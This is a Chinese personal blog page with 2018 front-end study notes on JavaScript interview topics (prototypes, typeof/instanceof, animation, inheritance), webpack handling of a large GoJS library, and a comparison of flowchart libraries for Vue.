<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">score</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.score = score;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student.prototype = <span class="keyword">new</span> Person(<span class="string">'李明'</span>,<span class="number">22</span>);</span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> Student(<span class="number">99</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(s <span class="keyword">instanceof</span> Student);  <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(s <span class="keyword">instanceof</span> Person);  <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(s <span class="keyword">instanceof</span> <span class="built_in">Object</span>);  <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<img src="/study/2018/9/mianjing/proto_link.png">
<p>手绘原型链：<br><a href="https://blog.csdn.net/Picking_up_stones/article/details/70050086" target="_blank" rel="noopener">https://blog.csdn.net/Picking_up_stones/article/details/70050086</a></p>
<p>原型链是什么？<br>原型链是一种机制，指的是JavaScript每个对象包括原型对象都有一个内置的[[proto]]属性指向创建它的函数对象的原型对象，直到指向Object对象为止。</p>
<p>为什么需要原型链？<br>继续和共享</p>
<h4 id="typeof-和instanceof原理。"><a href="#typeof-和instanceof原理。" class="headerlink" title="typeof 和instanceof原理。"></a>typeof 和instanceof原理。</h4><ol>
<li>instanceof原理：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//设 L instanceof R </span></span><br><span class="line"><span class="comment">//通过判断</span></span><br><span class="line"> L.__proto__.__proto__ ..... === R.prototype ？</span><br><span class="line"><span class="comment">//最终返回true or false</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>typeof原理：<br>在 javascript 的最初版本中，使用的 32 位系统，为了性能考虑使用低位存储了变量的类型信息：</p>
<p> 000：对象<br> 1：整数<br> 010：浮点数<br> 100：字符串<br> 110：布尔<br> 有 2 个值比较特殊：<br> undefined：用 - （−2^30）表示。<br> null：对应机器码的 NULL 指针，一般是全零。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span> === <span class="string">'object'</span>;</span><br><span class="line"><span class="comment">/*这样一来，null 就出了一个 bug。根据 type tags 信息，低位是 000，因此 null 被判断成了一个对象。这就是为什么 typeof null 的返回值是 object。*/</span></span><br><span class="line"><span class="literal">null</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span> === <span class="literal">false</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>而<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span> <span class="keyword">instanceof</span> <span class="literal">null</span></span><br></pre></td></tr></table></figure></p>
<p>会抛出异常：<code>Uncaught TypeError: Right-hand side of &#39;instanceof&#39; is not an object</code></p>
<p>判断类型的代码是这么写:undefined-&gt;对象-&gt;数字-&gt;….</p>
<h4 id="指出JS的宿主对象和原生对象的区别，为什么扩展JS内置对象不是好的做法？有哪些内置对象和内置函数？"><a href="#指出JS的宿主对象和原生对象的区别，为什么扩展JS内置对象不是好的做法？有哪些内置对象和内置函数？" class="headerlink" title="指出JS的宿主对象和原生对象的区别，为什么扩展JS内置对象不是好的做法？有哪些内置对象和内置函数？"></a>指出JS的宿主对象和原生对象的区别，为什么扩展JS内置对象不是好的做法？有哪些内置对象和内置函数？</h4><p>原生对象：在运行过程中动态创建的对象，需要new</p>
<p>内置对象：在引擎初始化阶段就被创建好的对象。而ECMA-262 只定义了两个内置对象，即 Global 和 Math 。内置对象是原生对象的一种。</p>
<p>宿主对象：ECMAScript官方未定义的对象都属于宿主对象。包含两大类，一个是宿主提供，一个是自定义类对象</p>
<p>为什么扩展JS内置对象不是好的做法：<br>因为你不知道哪一天浏览器或javascript本身就会实现这个方法，而且和你扩展的实现有不一致的表现。到时候你的javascript代码可能已经在无数个页面中执行了数年，而浏览器的实现导致所有使用扩展原型的代码都崩溃了。。。</p>
<h4 id="js动画和css3动画比较-requestAnimationFrame优势"><a href="#js动画和css3动画比较-requestAnimationFrame优势" class="headerlink" title="js动画和css3动画比较/requestAnimationFrame优势"></a>js动画和css3动画比较/requestAnimationFrame优势</h4><p>CSS动画<br>优点： </p>
<p>(1)浏览器可以对动画进行优化。</p>
<p>1、 浏览器使用与 requestAnimationFrame 类似的机制，requestAnimationFrame比起setTimeout，setInterval设置动画的优势主要是<br>    1)requestAnimationFrame 会把每一帧中的所有DOM操作集中起来，在一次重绘或回流中就完成,并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率,一般来说,这个频率为每秒60帧。<br>    2)在隐藏或不可见的元素中requestAnimationFrame不会进行重绘或回流，这当然就意味着更少的的cpu，gpu和内存使用量。</p>
<p>2、强制使用硬件加速 （通过 GPU 来提高动画性能）</p>
<p>(2)代码相对简单,性能调优方向固定，浏览器会对CSS3的动画做一些优化（比如专门新建一个图层用来跑动画）</p>
<p>(3)对于帧速表现不好的低版本浏览器，CSS3可以做到自然降级，而JS则需要撰写额外代码。</p>
<p>缺点：</p>
<p>　　1、 运行过程控制较弱,无法附加事件绑定回调函数。CSS动画只能暂停,不能在动画中寻找一个特定的时间点，不能在半路反转动画，不能变换时间尺度，不能在特定的位置添加回调函数或是绑定回放事件,无进度报告</p>
<p> 　  2、  代码冗长。想用 CSS 实现稍微复杂一点动画,最后CSS代码都会变得非常笨重。</p>
<h4 id="使用requestAnimationFrame有什么好处？"><a href="#使用requestAnimationFrame有什么好处？" class="headerlink" title="使用requestAnimationFrame有什么好处？"></a>使用<code>requestAnimationFrame</code>有什么好处？</h4><p>浏览器可以优化并行的动画动作，更合理的重新排列动作序列，并把能够合并的动作放在一个渲染周期内完成，从而呈现出更流畅的动画效果。比如，通过requestAnimationFrame()，JS动画能够和CSS动画/变换或SVG SMIL动画同步发生。另外，如果在一个浏览器标签页里运行一个动画，当这个标签页不可见时，浏览器会暂停它，这会减少CPU，内存的压力，节省电池电量。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shim layer with setTimeout fallback</span></span><br><span class="line"><span class="built_in">window</span>.requestAnimFrame = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span>  <span class="built_in">window</span>.requestAnimationFrame       ||</span><br><span class="line">          <span class="built_in">window</span>.webkitRequestAnimationFrame ||</span><br><span class="line">          <span class="built_in">window</span>.mozRequestAnimationFrame    ||</span><br><span class="line">          <span class="function"><span class="keyword">function</span>(<span class="params"> callback </span>)</span>&#123;</span><br><span class="line">            <span class="built_in">window</span>.setTimeout(callback, <span class="number">1000</span> / <span class="number">60</span>);</span><br><span class="line">          &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// usage:</span></span><br><span class="line"><span class="comment">// instead of setInterval(render, 16) ....</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">animloop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  requestAnimFrame(animloop);</span><br><span class="line">  render();</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">// place the rAF *before* the render() to assure as close to</span></span><br><span class="line"><span class="comment">// 60fps with the setTimeout fallback.</span></span><br></pre></td></tr></table></figure></p>
<h4 id="css3动画，transition和animation的区别，"><a href="#css3动画，transition和animation的区别，" class="headerlink" title="css3动画，transition和animation的区别，"></a>css3动画，transition和animation的区别，</h4><ol>
<li>触发条件不同。transition通常和hover等事件配合使用，由事件触发。animation则和gif动态图差不多，立即播放。</li>
<li><p>循环。 animation可以设定循环次数。 When triggered, a transition runs only once.You can make a transition loop by fiddling with the transitionEnd event, but that isn’t particularly straightforward - especially when compared with animations.</p>
<blockquote>
<p>What About transition: all?<br>You do not have to specify every property that you care about when using a transition. You could simplify your life by using the all value instead: transition: all .5s ease-in. I do not recommend this because you will take a performance hit. Your browser is now listening for a whole lotta properties as opposed to just a few that you know you will be modifiying. Unless you have a strong need to do this, I would recommend specifying each CSS property you wish to transition individually.</p>
</blockquote>
</li>
<li><p>精确性。 animation可以设定每一帧的样式和时间。tranistion 只能设定头尾。 animation中可以设置每一帧需要单独变化的样式属性， transition中所有样式属性都要一起变化。</p>
</li>
<li>与javascript的交互。animation与js的交互不是很紧密。tranistion和js的结合更强大。js设定要变化的样式，transition负责动画效果。A transition only plays as a reaction to a CSS property that has changed</li>
</ol>
<p><a href="https://www.kirupa.com/snippets/move_element_to_click_position.htm" target="_blank" rel="noopener">https://www.kirupa.com/snippets/move_element_to_click_position.htm</a></p>
<h4 id="animation的属性，加速度，重力的模拟实现"><a href="#animation的属性，加速度，重力的模拟实现" class="headerlink" title="animation的属性，加速度，重力的模拟实现"></a>animation的属性，加速度，重力的模拟实现</h4><p><a href="https://blog.csdn.net/drd_zsd123/article/details/80126260" target="_blank" rel="noopener">https://blog.csdn.net/drd_zsd123/article/details/80126260</a><br><a href="./canvas.html">canvas实现</a></p>
<h4 id="什么是“use-strict”-好处和坏处"><a href="#什么是“use-strict”-好处和坏处" class="headerlink" title="什么是“use strict”,好处和坏处"></a>什么是“use strict”,好处和坏处</h4><p>优点：</p>
<ol>
<li>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</li>
<li>消除代码运行的一些不安全之处，保证代码运行的安全；</li>
<li>提高编译器效率，增加运行速度；</li>
<li>为未来新版本的Javascript做好铺垫。<br>注：经过测试 IE6,7,8,9 均不支持严格模式。</li>
</ol>
<p>缺点：现在网站的 JS 都会进行压缩，一些文件用了严格模式，而另一些没有。这时这些本来是严格模式的文件，被 merge 后，这个串就到了文件的中间，不仅没有指示严格模式，反而在压缩后浪费了字节</p>
<p>。</p>
<h4 id="如何实现图片滚动懒加载"><a href="#如何实现图片滚动懒加载" class="headerlink" title="如何实现图片滚动懒加载"></a>如何实现图片滚动懒加载</h4><p> 通俗的讲就是：当访问一个页面的时候，先把img元素或是其他元素的背景图片路径替换成一张大小为1*1px图片的路径（这样就只需请求一次），只有当图片出现在浏览器的可视区域内时，才设置图片正真的路径，让图片显示出来。这就是图片懒加载。<br>如何获取正真的路径，这个简单，现在正真的路径存在元素的<code>data-url</code>（这个名字起个自己认识好记的就行）属性里，要用的时候就取出来，再设置；<br><a href="https://www.cnblogs.com/flyromance/p/5042187.html" target="_blank" rel="noopener">https://www.cnblogs.com/flyromance/p/5042187.html</a></p>
<h4 id="ES5与ES6继承的区别"><a href="#ES5与ES6继承的区别" class="headerlink" title="ES5与ES6继承的区别"></a>ES5与ES6继承的区别</h4><ol>
<li>ES5先创建子类的实例对象，再实例化父类并添加到子类this中（Parent.apply(this)）<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在es5中的继承：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parent</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span> a = a;</span><br><span class="line">    <span class="keyword">this</span> b = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">child</span>(<span class="params">c</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span> c = c</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">parent.call(child,<span class="number">1</span>,<span class="number">2</span>)<span class="comment">//通过子集去继承父级：</span></span><br><span class="line"><span class="comment">//而去看call的底层方法可知，继承的过程是通过prototype属性,相当于</span></span><br><span class="line">child.prototype = <span class="keyword">new</span> parent(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li>ES6是先创建父类的实例对象，在实例化子类中通过调用super方法访问父级后，再用子类的构造函数修改this。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">parent</span></span>&#123;</span><br><span class="line">　　<span class="keyword">constructor</span>(a,b)&#123;</span><br><span class="line">　　　　<span class="keyword">this</span>.a = a;</span><br><span class="line">　　　　<span class="keyword">this</span>.b = b;</span><br><span class="line">　　&#125;</span><br><span class="line">　　parentMethods()&#123;</span><br><span class="line">　　　　<span class="keyword">return</span> <span class="keyword">this</span>.a + <span class="keyword">this</span>.b</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child</span> <span class="keyword">extends</span> <span class="title">parent</span></span>&#123;</span><br><span class="line">　　<span class="keyword">constructor</span>(a,b,c)&#123;</span><br><span class="line">　　　　<span class="keyword">super</span>(a,b);</span><br><span class="line">　　　　<span class="keyword">this</span>.c = c;</span><br><span class="line">　　&#125;</span><br><span class="line">　　childMethods()&#123;</span><br><span class="line">　　　　<span class="keyword">return</span> <span class="keyword">this</span>.c + <span class="string">','</span> + <span class="keyword">super</span>.parentMethods()</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> point = <span class="keyword">new</span> child(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">alert(point.childMethods());</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>子类必须在constructor方法中调用super方法，否则新建实例报错。因为子类没有自己的this对象，而是继承了父类的this对象，然后对其进行加工。如果不调用super方法，子类得不到this对象。</p>
<h4 id="module-exports和exports区别"><a href="#module-exports和exports区别" class="headerlink" title="module.exports和exports区别"></a>module.exports和exports区别</h4><ol>
<li>module.exports 初始值为一个空对象 {}</li>
<li>exports 是指向的 module.exports 的引用</li>
<li>require() 返回的是 module.exports 而不是 exports</li>
</ol>
<p>exports是引用 module.exports<strong>的值</strong>。module.exports 被改变的时候，exports不会被改变</p>
<p> JS如何实现重载和多态<br>轮播图的实现，以及轮播图组件开发，轮播10000张图片过程 </p>
<p>document load和document DOMContentLoaded两个事件的区别</p>
<p>常用的数组api，字符串api<br>原生事件绑定（跨浏览器），dom0和dom2的区别？</p>
<p>web端cookie的设置和获取<br>setTimeout和promise的执行顺序</p>
<p>navigator对象，location和history</p>
<p>手指点击可以触控的屏幕时，是什么事件？<br>JS的API有哪些应用到了函数柯里化的实现？(bind函数和数组的reduce方法用到了函数柯里化。)</p>
<p> 手写Ajax，XMLHttpRequest<br> 实现继承的多种方式和优缺点<br> 深拷贝<br> 编写一个通用的事件监听函数<br> 八大排序算法<br> websocket的工作原理和机制</p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/学习/">学习</a>►<a class="article-category-link" href="/categories/学习/专题笔记/">专题笔记</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/面试/">面试</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/study/2018/9/bigfile-webpack.html" title="库文件太大，webpack打包时怎么办" itemprop="url">库文件太大，webpack打包时怎么办</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Ruiyu Lin" target="_blank" itemprop="author">Ruiyu Lin</a>
		
  <p class="article-time">
    <time datetime="2018-09-02T16:00:00.000Z" itemprop="datePublished"> Published 2018-09-03</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>针对上篇gojs太大的问题的衍生出大文件打包的问题</p>
<h3 id="exclude-设置不通过babel-loader编译的目录"><a href="#exclude-设置不通过babel-loader编译的目录" class="headerlink" title="exclude 设置不通过babel-loader编译的目录"></a>exclude 设置不通过babel-loader编译的目录</h3><p>写成从node_modules导入的，就不会出现run慢或者报错，还很快。这是为什么?<br>是因为node_modules里面不会再实时编译了<br>那有没有方法，webpack可以设置一些不实时编译的文件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">        loader: <span class="string">'babel-loader'</span>,</span><br><span class="line">        include: [resolve(<span class="string">'src'</span>)],</span><br><span class="line">        exclude:[</span><br><span class="line">          resolve(<span class="string">"src/components/common/gojs"</span>)</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br></pre></td></tr></table></figure></p>
<p>exclude可以排除目录 ，不用babel-loader编译</p>
<p>库很大，要么分包 ，或异步加载，或单独引入，否则生成环境打的包会很大</p>
<h3 id="externals设置不打包的文件"><a href="#externals设置不打包的文件" class="headerlink" title="externals设置不打包的文件"></a>externals设置不打包的文件</h3><p>打包的时候不打包这个，然后需要在生产环境页面单独引入这个script<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">externals:&#123;</span><br><span class="line">    <span class="string">'go'</span>:<span class="string">'go'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./static/js/go.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="add-asset-html-webpack-plugin"><a href="#add-asset-html-webpack-plugin" class="headerlink" title="add-asset-html-webpack-plugin"></a>add-asset-html-webpack-plugin</h3><p>add-asset-html-webpack-plugin，可以配置修改打包后的index.html.<br>在webpack.prod.config中引入并添加，用法如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> AddAssetHtmlPlugin(&#123;</span><br><span class="line">    filepath:path.join(__dirname,<span class="string">'src/components/common/gojs/go.js'</span>),</span><br><span class="line">    outputPath:<span class="string">'./static/js'</span>,</span><br><span class="line">    publicPath:<span class="string">'./static/js'</span>,<span class="comment">//script标签中的路径前缀</span></span><br><span class="line">    includeSourcemap:<span class="literal">false</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>打包后结果如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./static/js/go.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="CommonsChunkPlugin分包，HtmlWebpackPlugin插入"><a href="#CommonsChunkPlugin分包，HtmlWebpackPlugin插入" class="headerlink" title="CommonsChunkPlugin分包，HtmlWebpackPlugin插入"></a>CommonsChunkPlugin分包，HtmlWebpackPlugin插入</h3><p>分包等的时间久点<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> chunks = [<span class="string">'manifest'</span>, <span class="string">'vendor'</span>, <span class="string">'gojs'</span>, <span class="string">'app'</span>];</span><br><span class="line"><span class="keyword">new</span> webpack.optimize.CommonsChunkPlugin(&#123;</span><br><span class="line">      name: <span class="string">'gojs'</span>,</span><br><span class="line">      minChunks (<span class="built_in">module</span>) &#123;</span><br><span class="line">        <span class="comment">// any required modules inside node_modules are extracted to vendor</span></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">          <span class="built_in">module</span>.resource &amp;&amp;</span><br><span class="line">          /go\.js$/.test(<span class="built_in">module</span>.resource) === <span class="number">0</span></span><br><span class="line">        )</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line"> <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      filename: config.build.index,</span><br><span class="line">      template: <span class="string">'index.html'</span>,</span><br><span class="line">      inject: <span class="literal">true</span>,</span><br><span class="line">      minify: &#123;</span><br><span class="line">        removeComments: <span class="literal">true</span>,</span><br><span class="line">        collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">        removeAttributeQuotes: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      chunks,</span><br><span class="line">      chunksSortMode: <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> chunks.indexOf(a.names[<span class="number">0</span>]) - chunks.indexOf(b.names[<span class="number">0</span>])</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;),</span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/学习/">学习</a>►<a class="article-category-link" href="/categories/学习/专题笔记/">专题笔记</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/study/2018/8/procedure.html" title="vue中使用gojs/jointjs" itemprop="url">vue中使用gojs/jointjs</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Ruiyu Lin" target="_blank" itemprop="author">Ruiyu Lin</a>
		
  <p class="article-time">
    <time datetime="2018-08-22T16:00:00.000Z" itemprop="datePublished"> Published 2018-08-23</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>因为公司项目需求，要画出相关业务的流程图，以便客户了解自己身处何处</p>
<p>搜索框输入 “前端流程图插件”，查了很多资料，总结一下有以下几种</p>
<h3 id="Raphael"><a href="#Raphael" class="headerlink" title="Raphael"></a>Raphael</h3><p><a href="http://dmitrybaranovskiy.github.io/raphael/reference.html" target="_blank" rel="noopener">http://dmitrybaranovskiy.github.io/raphael/reference.html</a><br>这个星星很多，但是我找到的demo都要自己设置x坐标，y坐标，找不到自动布局的demo</p>
<p><a href="http://www.weixuehao.com/archives/370" target="_blank" rel="noopener">http://www.weixuehao.com/archives/370</a></p>
<h3 id="flow-chart"><a href="#flow-chart" class="headerlink" title="flow-chart"></a>flow-chart</h3><p>代码写法繁琐，不是json就可以解决，效果也比较丑,PASS</p>
<h3 id="darge-d3"><a href="#darge-d3" class="headerlink" title="darge-d3"></a>darge-d3</h3><p>github :<a href="https://github.com/dagrejs/dagre-d3" target="_blank" rel="noopener">https://github.com/dagrejs/dagre-d3</a></p>
<p>效果图<br><img src="/study/2018/8/procedure/darge-d3.png"></p>
<p>下载里面的demo,改一下json就可以了<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// States </span><br><span class="line">var states = [ "NEW", "SUBMITTED","FINISHED" ,"FAILED","DELIVER", </span><br><span class="line">               "CANCELED", "ABOLISHED" , "DELETED","REFUNDING","REFUNDED"];</span><br><span class="line">var map = ['新创建','已提交','已完成','提交失败',"交付中",</span><br><span class="line">              '已取消','废除','已删除','退款中',"已退款"]</span><br><span class="line">// Automatically label each of the nodes</span><br><span class="line">states.forEach(function(state,index) &#123; g.setNode(state, &#123; label: `$&#123;map[index]&#125;($&#123;state&#125;)`&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">// Set up the edges</span><br><span class="line">g.setEdge("NEW", "FAILED",     &#123; label: "后台接口自动"&#125;);</span><br><span class="line">g.setEdge("NEW", "SUBMITTED",   &#123; label: "后台接口自动" &#125;);</span><br><span class="line">g.setEdge("NEW", "CANCELED",   &#123; label: "用户取消订单" &#125;);</span><br><span class="line">g.setEdge("SUBMITTED","CANCELED",     &#123; label: "用户取消订单" &#125;);</span><br><span class="line">g.setEdge("SUBMITTED", "ABOLISHED",  &#123; label: "用户超过48小时未支付，\n系统自动取消"&#125;);</span><br><span class="line">g.setEdge("ABOLISHED","DELETED",      &#123; label: "已删除" &#125;);</span><br><span class="line">g.setEdge("CANCELED", "DELETED",   &#123; label: "已删除"&#125;);</span><br><span class="line">g.setEdge("FAILED",   "SUBMITTED",      &#123; label: "后台接口自动" &#125;);</span><br><span class="line"></span><br><span class="line">g.setEdge("SUBMITTED",   "DELIVER",     &#123; label: "用户支付" &#125;);</span><br><span class="line">g.setEdge("FINISHED",   "REFUNDING",     &#123; label: "用户退款" &#125;);</span><br><span class="line"></span><br><span class="line">g.setEdge("DELIVER",   "FINISHED",     &#123; label: "交付完成" &#125;);</span><br><span class="line">g.setEdge("REFUNDING",   "REFUNDED",     &#123; label: "已退款" &#125;);</span><br><span class="line">g.setEdge("REFUNDED",   "DELETED",     &#123; label: "已删除" &#125;);</span><br><span class="line">g.setEdge("DELIVER",   "REFUNDING",     &#123; label: "用户退款" &#125;);</span><br><span class="line">g.setEdge("FAILED",   "CANCELED",     &#123; label: "用户取消订单" &#125;);</span><br></pre></td></tr></table></figure></p>
<p><strong>不满意的地方</strong>：画出来的图是垂直方向的，我要的是水平方向,PASS</p>
<h3 id="gojs"><a href="#gojs" class="headerlink" title="gojs"></a>gojs</h3><p>github :<a href="https://github.com/NorthwoodsSoftware/GoJS" target="_blank" rel="noopener">https://github.com/NorthwoodsSoftware/GoJS</a></p>
<p>可以通过<code>npm install gojs -save</code>安装</p>
<p>效果图<br><img src="/study/2018/8/procedure/gojs.png"></p>
